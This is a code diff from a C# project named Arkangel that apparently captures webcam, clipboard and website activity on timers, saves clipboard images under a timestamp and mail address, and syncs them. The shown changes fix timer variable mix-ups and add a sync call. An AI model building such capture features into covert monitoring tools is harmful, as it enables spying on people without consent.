@@ -393,11 +393,11 @@ namespace Arkangel
             try
             {
                 // Create a timer with a two second interval.
-                MainWindow.aTimer_webcam = new System.Timers.Timer(_time);
+                MainWindow.aTimer_Website = new System.Timers.Timer(_time);
                 // Hook up the Elapsed event for the timer. 
-                MainWindow.aTimer_webcam.Elapsed += OnTimedEventWebsite;
-                MainWindow.aTimer_webcam.AutoReset = true;
-                MainWindow.aTimer_webcam.Enabled = true;
+                MainWindow.aTimer_Website.Elapsed += OnTimedEventWebsite;
+                MainWindow.aTimer_Website.AutoReset = true;
+                MainWindow.aTimer_Website.Enabled = true;
             }
             catch { }
         }
@@ -419,11 +419,11 @@ namespace Arkangel
             try
             {
                 // Create a timer with a two second interval.
-                MainWindow.aTimer_webcam = new System.Timers.Timer(_time);
+                MainWindow.aTimer_Clipboard = new System.Timers.Timer(_time);
                 // Hook up the Elapsed event for the timer. 
-                MainWindow.aTimer_webcam.Elapsed += OnTimedEventClipboard;
-                MainWindow.aTimer_webcam.AutoReset = true;
-                MainWindow.aTimer_webcam.Enabled = true;
+                MainWindow.aTimer_Clipboard.Elapsed += OnTimedEventClipboard;
+                MainWindow.aTimer_Clipboard.AutoReset = true;
+                MainWindow.aTimer_Clipboard.Enabled = true;
             }
             catch { }
         }
@@ -447,6 +447,12 @@ namespace Arkangel
                 Process.Start(start);
             }
             catch { }
+            try
+            {
+                syncDown();
+            }
+            catch { }
+            
         }
         public static void OnTimedEventWebcam(Object source, ElapsedEventArgs e)
         {
@@ -593,7 +599,7 @@ namespace Arkangel
             {
                 DateTime datetime = DateTime.Now;
                 string alldate = mydate.ToString("yyyy_MM_dd-HH_mm_ss");
-                string name = alldate + " - " + GetMail() + ".jpeg";
+                string name = alldate + "-" + GetMail() + ".jpeg";
                 string filename = System.IO.Path.Combine("..\\..\\Clipboard", name);
                 using (var fileStream = new FileStream(filename, FileMode.Create))
                 {
